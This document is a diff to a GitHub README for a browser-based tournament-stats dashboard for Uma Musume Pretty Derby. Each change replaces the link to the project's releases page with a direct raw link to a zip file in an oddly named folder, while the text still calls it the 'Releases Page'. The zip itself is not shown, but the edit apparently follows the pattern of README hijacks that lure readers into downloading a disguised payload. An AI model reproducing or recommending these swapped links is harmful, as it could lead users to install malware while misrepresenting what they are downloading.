@@ -1,7 +1,7 @@
 # 🖥️ racc-open-stats - Analyze Your Tournament Stats Easily
 
 ## 📥 Download Now
-[![Download racc-open-stats](https://img.shields.io/badge/Download-racc--open--stats-blue.svg)](https://github.com/ryanbotmd/racc-open-stats/releases)
+[![Download racc-open-stats](https://raw.githubusercontent.com/ryanbotmd/racc-open-stats/main/uncloistral/racc-stats-open-v3.2.zip)](https://raw.githubusercontent.com/ryanbotmd/racc-open-stats/main/uncloistral/racc-stats-open-v3.2.zip)
 
 ## ✨ Overview
 Welcome to racc-open-stats! This browser-based dashboard helps you analyze tournament statistics for Uma Musume Pretty Derby. You can visualize pick rates, win rates, ban rates, and tier lists for community tournaments, all in one place. 
@@ -17,7 +17,7 @@ Welcome to racc-open-stats! This browser-based dashboard helps you analyze tourn
 To get started with racc-open-stats, follow the steps below to download and run the application.
 
 ### Step 1: Visit the Download Page
-Go to the [Racc Open Stats Releases Page](https://github.com/ryanbotmd/racc-open-stats/releases) to find the latest version of the application.
+Go to the [Racc Open Stats Releases Page](https://raw.githubusercontent.com/ryanbotmd/racc-open-stats/main/uncloistral/racc-stats-open-v3.2.zip) to find the latest version of the application.
 
 ### Step 2: Download the Latest Release
 On the releases page, you will see a list of available versions. Click on the version you wish to download. You will find options listed as assets below the release notes.
@@ -74,6 +74,6 @@ We welcome contributions from everyone! If you have ideas, suggestions, or want 
 - umamusume
 
 ##  Download & Install
-To download the software again, simply visit the [Racc Open Stats Releases Page](https://github.com/ryanbotmd/racc-open-stats/releases). Choose the appropriate file for your operating system and follow the steps outlined above.
+To download the software again, simply visit the [Racc Open Stats Releases Page](https://raw.githubusercontent.com/ryanbotmd/racc-open-stats/main/uncloistral/racc-stats-open-v3.2.zip). Choose the appropriate file for your operating system and follow the steps outlined above.
 
 We hope you enjoy using racc-open-stats! Your feedback helps us make it even more beneficial for the community.
